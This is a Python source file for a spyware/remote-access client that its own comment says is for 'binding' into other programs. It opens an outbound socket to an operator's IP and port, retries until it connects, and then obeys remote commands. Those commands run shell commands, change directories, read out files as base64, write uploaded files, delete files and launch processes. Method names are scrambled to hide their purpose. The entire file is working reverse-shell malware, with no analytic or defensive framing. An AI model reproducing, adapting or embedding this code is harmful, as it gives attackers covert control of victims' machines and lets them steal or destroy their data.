import subprocess
import socket
import json
import os
import sys
import base64
import time

#Class-Based Object for binding spyware in custom software/program.

class Target:

    #Initializing our object by defining client socket.
    
    def __init__(self,ip,port,ipv6):   #Pass True in Actual Parameter for an ipv6 protocol

        if ipv6:
            self.sp = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        else:
            self.sp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                self.sp.connect((ip,port))
                break
            except ConnectionRefusedError:
                time.sleep(5)
                continue

    #Rest of the methods for other features like downloading and uploading data & files, sending commands and receiving output.
        
    def _374egv(self,data):
        
        json_data = json.dumps(data)
        self.sp.send(json_data.encode())

    def my779f(self):
        
        data = "".encode()
        while True:
            try:
                data = data + self.sp.recv(1024)
                return json.loads(data)
            except ValueError:
                continue
            except:
                break
            
    def _5zxun5(self,command):
        
        try: 
            return subprocess.check_output(command, shell=True)
        except Exception as e:
            return "[-] Command Error\n" + str(e)
        
    def fz2v9t(self, path):
        
        os.chdir(path)
        return "[+] Changing Working Directory To "+path

    def qzwu9g(self,path):
        
        with open(path,"rb") as f:
            return base64.b64encode(f.read()).decode()

    def _73mvhb(self,path,content):
        
        with open(path,"wb") as f:
            f.write(base64.decodebytes(content))
            return "[+] Upload Successful"

    def x98skil(self,file):
        
        os.remove(file)
        return "[+] Successfully Removed "+file

    def run(self):
        
        while True:
            command = self.my779f()
            if len(command) != 0:
                try:
                    if command[0].lower() == "exit":
                        self.sp.close()
                        break
                    elif command[0] == "cd" and len(command) > 1:
                        result = self.fz2v9t(" ".join(command[1:]))
                    elif command[0] == "download":
                        result = self.qzwu9g(" ".join(command[1:]))
                    elif command[0] == "upload":
                        result = self._73mvhb(command[1], command[2].encode())
                    elif command[0] == "delete":
                        result = self.x98skil(" ".join(command[1:]))
                    elif command[0] == "execute":
                        subprocess.Popen(" ".join(command[1:]),shell=True)
                        result = "[+] Executed "+" ".join(command[1:])+"!"     
                    else:
                        result = self._5zxun5(command).decode()   
                except Exception as e:
                    result = "[-] Error Processing\n" + str(e)
                self._374egv(result)
                    
            else:
                self._374egv("Enter a command")
        self.sp.close()
